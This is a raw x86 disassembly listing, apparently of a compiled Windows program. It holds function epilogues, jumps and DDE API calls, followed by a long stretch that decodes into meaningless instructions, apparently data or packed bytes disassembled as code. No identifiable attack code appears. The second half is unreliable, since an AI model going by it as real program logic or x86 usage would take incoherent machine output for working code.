jmp sub_403a98
sub_489932
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_489a44
retn
sub_489a48
retn
j_sub_403a98#5
jmp sub_403a98
sub_489b60
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_489c35
jmp sub_403a98
sub_489c3c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_489cac
push ecx
push edx
call DdeAccessData
retn
sub_489cb4
push edx
call DdeUnaccessData
retn
sub_489dd4
mov eax [ eax + 0x10 ]
call sub_4899d0
retn
sub_489e5c
mov [ eax + 0x34 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_421b4c
sub_489f38
jmp sub_403a98
sub_489f3f
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_489fcf
jmp sub_403a98
sub_489fd6
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403a98#4
jmp sub_403a98
sub_48a066
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48a070
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
j_sub_403a98#3
jmp sub_403a98
sub_48a1b6
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48a1c0
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_48a1d4
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_48a3d0
jmp sub_403a98
sub_48a3d7
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
j_sub_403a98#2
jmp sub_403a98
sub_48a4be
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_48a5e9
jmp sub_403a98
sub_48a5f0
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_48a8a1
jmp sub_403a98
sub_48a8a8
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48a8b4
mov edx [ eax + 0x38 ]
push edx
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdePostAdvise
retn
sub_48a95d
jmp sub_403a98
sub_48a964
pop ebp
retn
sub_48ae61
sbb al 0x51
int1
push ds
0x7e2b
sub_48afe2
int1
push ds
retn 0x7e75
sub_48b00c
call [ esi + 0x1e179797 ]
0x7e87
sub_48b09a
std
sti
int1
push ds
retn 0x1c5f
sub_48b131
dec edi
int1
push ds
0x7e9b
sub_48b137
add [ eax + 0x7079797 ] cl
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
retn 0x7e79
sub_48b15c
xchg edi eax
xchg edi eax
pop es
pop es
std

sub_48b162
iretd
sub_48b63b
push ds
0xe5b17e5d 0x9797
sub_48b6a0
pop es
pop es
pop es
pop es
adc al 0x7f
xchg ebp eax
jle r-xdata
retn
sub_48b6aa
xchg edi eax
xchg edi eax
pop es
pop es
movsb [ edi ] [ esi ]
dec esp
int1
push ds
0x7e85
sub_48b6b5
in al 0x92
xchg edi eax
xchg edi eax
jle r-xdata
0x9797
sub_48b7be
xchg edi eax
pop es
pop es
pop es
pop es
pop es
[ edi - 0x43 ]
sub_48b84b
rcl [ edi + 0x7070797 ] 0x1
push 0xaa7ec7c0
xlat
xchg edi eax
xchg edi eax
std
sti
int1
push ds
retn 0xcd49
sub_48b862
mov [ edi + 0x7070797 ] dl
retn 0x7b1c
sub_48b96a
cmp [ ebx + 0x1ec004c7 ] ah
shl [ edi - 0x6842cd81 ] 0x1
xchg edi eax
call [ esi ]
in al dx
stosb [ edi ]
mov ah 0x7e
scasd [ edi ]
retn
sub_48ba51
inc ebp
int1
push ds
retn 0x7e51
sub_48bb97
retn 0x9797
sub_48bd3e
xchg edi eax
xchg edi eax
iretd
sub_48bded
push ds
0xfbfdc87d 0x537e
sub_48be14
xchg edi eax
xchg edi eax
jle r-xdata
int1
push ds
retn 0xf1bb
int3
sub_48c4f3
rol eax 0x7e
dec esi
iretd
sub_48c5ed
fist [ edi + 0x7070797 ]
pop ds

sub_48cae6
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sbb bl ah
ffreep st6
sbb al 0xdc
iretd
sub_48cd99
les edi [ esi + 0x55 ]
fist [ edi + 0x7070797 ]
pop es
pop es
sar [ esi - 0x2f ] 0xd6
xchg edi eax
xchg edi eax
iretd
sub_48d636
push ss
rcl [ edi + 0x7070797 ] cl
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x1cc3
sub_48d647
dec esi
jle r-xdata
[ edi - 0x3f9c5660 ]
test al 0x97
xchg edi eax
pop es
pop es
sub_48d763
mov bl 0x97
xchg edi eax
pop es
pop es
pop es
pop es
int1
push ds
shr [ ebx + 0x1a ] cl
retn 0x1a87
sub_48db63
stc
sar [ esi - 0x34 ] 0x4e
push 0x7070768
pop es
pop es
pop es
call [ edi + 0x7e9797a7 ]
vmwrite ebp [ eax + 0x68 ]
iretd
sub_48dd12
push ds
0xc21ef161 0xfdcb
sub_48e099
push ds
retn 0x1cd5
sub_48e0a1
imul ebp [ eax + 0x68 ] 0x14
0xd7e979b 0x97b5
sub_48e668
rcl [ edi + 0x47c37e97 ] cl
push 0x7070768
pop es
pop es
iretd
sub_48e811
xchg [ edi + 0x7070797 ] dl
pop es
pop es
pop es
pop es
pop es
push ds
0x506f
sub_48e820
xchg esp eax
iretd
sub_48e991
mov ebx 0xe7fd9797
int1
push ds
shl [ ebp - 0x31 ] cl
std
mov ecx 0x63d21ef1
iretd
sub_48ecdc
mov al [ 0x1ef19797 ]
0x837ec86b 0x6871
sub_48f274
0x7e63
sub_48f6db
0x979a
sub_48f765
sub [ eax + 0x68 ] ch
int1
push ds
0xcc6f
sub_48f858
adc al 0xf2
imul edx [ edi - 0x686ee682 ] 0xffffff97
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x1c7b
sub_48fb88
int1
push ds
0x7e93
sub_48fbc4
dec ebp
push 0x1ef10768
0x7e35
sub_48fbcd
mov esp 0x768687e
pop es
pop es
pop es
pop es
int1
push ds
retn 0xcdf7
sub_48fbdb
std
cmc
int1
push ds
retn 0x7ef5
sub_48fcd2
0xc8f1fd79 0x1ef1
sub_48fcd9
0xf1691c67 0xea1e
sub_48fce0
sbb al 0x6e
int1
push ds
0x86417e63 0x9797
sub_48fd7c
std
hlt
sub_490327
dec edi
int1
push ds
0x7e6b
sub_490902
sbb al 0x4f
int1
push ds
0x7e71
sub_4909bf
std
in al 0xf1
push ds
0x7e3f
sub_4909c6
retn 0x6826
sub_4910bd
test [ edi - 0xef8f869 ] edx
push ds
0x9f9c7e2b 0x9797
sub_49117f
or ch [ eax + 0x68 ]
retn 0x2e7e
sub_4911dc
adc ebx [ 0x7e686841 ]
retn
sub_491344
inc edi
int1
push ds
retn 0x7e73
sub_4913c8
dec ah
int1
push ds
0x1c63
sub_49158c
dec edi
int1
push ds
0xa4cf
sub_4915a2
pushfd
pop eax
push 0x7ece0768

sub_491737
inc edi
dec ebp
push 0x7070768
int1
push ds
rol [ ebx - 0x5c ] cl
push edi
int1
push ds
retn 0xf159
sub_491805
push ds
0xa447e63 0x6868
sub_4918e1
push edi
sbb al 0x6e
int1
push ds
0x7e691c55 0x9da6
sub_491d66
push 0x4f1c0768
int1
push ds
0x7e87
sub_4922aa
add al 0x68
push 0xf1070707
push ds
retn 0x7e2b
sub_49239b
push 0xc0684be2

sub_49272a
push ds
push 0x7070768
std
aad 0xf1
push ds
retn 0x7e0f
sub_492818
or ebp [ eax + 0x68 ]
std
in eax 0xf1
push ds
retn 0xcd7d
j_sub_403a98
jmp sub_403a98
sub_492d8c
pop ebp
retn
sub_492f51
jmp sub_403a98
sub_492f58
pop edi
pop esi
pop ebx
pop ebp
retn
sub_492faa
retn
sub_492fab
jmp sub_403a98
j_sub_492faa
jmp sub_492faa
sub_492fb2
pop ebp
retn
